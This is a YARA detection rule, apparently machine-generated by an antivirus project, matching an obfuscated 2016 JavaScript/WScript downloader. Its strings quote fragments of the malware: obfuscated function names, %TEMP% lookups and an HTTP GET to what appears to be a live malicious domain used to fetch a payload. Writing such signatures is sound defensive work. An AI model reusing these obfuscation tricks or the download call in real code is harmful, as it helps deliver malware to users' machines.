rule sig_20160428_6a56e90ef68b7768e4cbdabf17f86a9a {
  meta:
    description = "datamaliciousorder - file 20160428_6a56e90ef68b7768e4cbdabf17f86a9a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9ff0a626da5201985736d7ff73deb7b99ef239b34c0ec4b7e00fb99600991fd2"

  strings:
    $s1  = "function RzkDdnPpsPtyVnfTpaWlh(WihGsvWpuPivJgdBxwIgl){BryOnlJcePgyYwjDmxYaz[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function RzkDdnPpsPtyVnfTpaWlh(WihGsvWpuPivJgdBxwIgl){BryOnlJcePgyYwjDmxYaz[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function FvoXuiNeqVdfCxzIpxMjm() {return BryOnlJcePgyYwjDmxYaz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "return RrdYruFovXpjZgmXliPxb - AgpThwFvpNbkBsbQnoGvq;};" fullword ascii
    $s5  = "function OuvGzzDjkKxuBeuAudRgk(RrdYruFovXpjZgmXliPxb, AgpThwFvpNbkBsbQnoGvq){MvbImiDpuGmbLdsYhlNsy = MvbImiDpuGmbLdsYhlNsy * 1; " ascii
    $s6  = "var BryOnlJcePgyYwjDmxYaz = function SvfUioAtoNzaZnnVguZad() {return NbkZesVrrOkwUkeSkbHzt[BveLrwSibCsyUhxVcdCxp](\"WScript\"+\"" ascii
    $s7  = "QkjKwlLxxDspKrgLamQxc[IdpHtbXlvXvaCmwOzyDpx](\"G\" + \"ET\", \"http://sarsudexpert.ru/q2ikcxz\", false);" fullword ascii
    $s8  = "var NbkZesVrrOkwUkeSkbHzt = this[\"WScript\"];" fullword ascii
    $s9  = "var BryOnlJcePgyYwjDmxYaz = function SvfUioAtoNzaZnnVguZad() {return NbkZesVrrOkwUkeSkbHzt[BveLrwSibCsyUhxVcdCxp](\"WScript\"+\"" ascii
    $s10 = "function FvoXuiNeqVdfCxzIpxMjm() {return BryOnlJcePgyYwjDmxYaz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (QkjKwlLxxDspKrgLamQxc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function OuvGzzDjkKxuBeuAudRgk(RrdYruFovXpjZgmXliPxb, AgpThwFvpNbkBsbQnoGvq){MvbImiDpuGmbLdsYhlNsy = MvbImiDpuGmbLdsYhlNsy * 1; " ascii
    $s13 = "function PucCtvVakYjnGknYejUsx(){return HuzIwpAiuHsyDwzGsyIzw + \"\";};" fullword ascii
    $s14 = "function GtaXqlAsfTujZknEuqJbg() {return ((KcsOpyDioUyhCiyXfiLxf == true) && (KcsOpyDioUyhCiyXfiLxf == UctJeaLauTuoNddGddEbm)) ?" ascii
    $s15 = "function GtaXqlAsfTujZknEuqJbg() {return ((KcsOpyDioUyhCiyXfiLxf == true) && (KcsOpyDioUyhCiyXfiLxf == UctJeaLauTuoNddGddEbm)) ?" ascii
    $s16 = "var UctJeaLauTuoNddGddEbm = false;" fullword ascii
    $s17 = "function DzyYnuOtlUxbHawFkfAgj()" fullword ascii
    $s18 = "UctJeaLauTuoNddGddEbm = true; " fullword ascii
    $s19 = "function SlrDqgTqgOyjBstBlrObr(){return BveLrwSibCsyUhxVcdCxp;};" fullword ascii
    $s20 = "var KcsOpyDioUyhCiyXfiLxf = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}